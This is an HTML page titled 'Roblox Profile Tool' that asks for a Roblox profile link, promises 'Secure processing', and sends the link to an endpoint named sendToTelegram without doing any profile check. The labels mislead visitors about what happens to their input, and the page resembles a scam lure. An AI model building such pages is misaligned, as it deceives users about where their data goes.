<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Tool</title>

<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Outfit;
}

body{
background:#050505;
color:white;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
overflow:hidden;
}

.glow{
position:absolute;
width:600px;
height:600px;
background:radial-gradient(circle,#ff003c55,transparent 70%);
filter:blur(60px);
}

.card{
position:relative;
width:500px;
padding:40px;
border-radius:25px;
background:rgba(20,20,20,0.8);
border:1px solid rgba(255,0,60,0.2);
box-shadow:0 0 60px rgba(255,0,60,0.2);
text-align:center;
backdrop-filter:blur(10px);
}

h1{
font-size:34px;
background:linear-gradient(90deg,#ff4d6d,#ff003c);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
margin-bottom:10px;
font-weight:800;
}

p{
color:#aaa;
margin-bottom:20px;
}

input{
width:100%;
padding:15px;
border-radius:12px;
border:none;
outline:none;
background:#111;
color:white;
margin-bottom:15px;
}

button{
width:100%;
padding:15px;
border:none;
border-radius:999px;
background:linear-gradient(90deg,#ff003c,#ff3355);
color:white;
font-weight:700;
cursor:pointer;
transition:.2s;
box-shadow:0 0 20px rgba(255,0,60,0.4);
}

button:hover{
transform:scale(1.03);
box-shadow:0 0 30px rgba(255,0,60,0.6);
}

.small{
margin-top:10px;
font-size:12px;
color:#777;
}
</style>
</head>

<body>

<div class="glow"></div>

<div class="card">
<h1>Roblox Profile Tool</h1>
<p>Enter your profile link</p>

<input id="profileLink" placeholder="https://www.roblox.com/users/...">

<button onclick="send()">Check Profile</button>

<div class="small">Secure processing</div>
</div>

<script>
async function send(){
const link=document.getElementById("profileLink").value;

if(!link){
alert("Enter link");
return;
}

await fetch("/api/sendToTelegram",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({profileLink:link})
});

alert("Sent!");
}
</script>

</body>
</html>
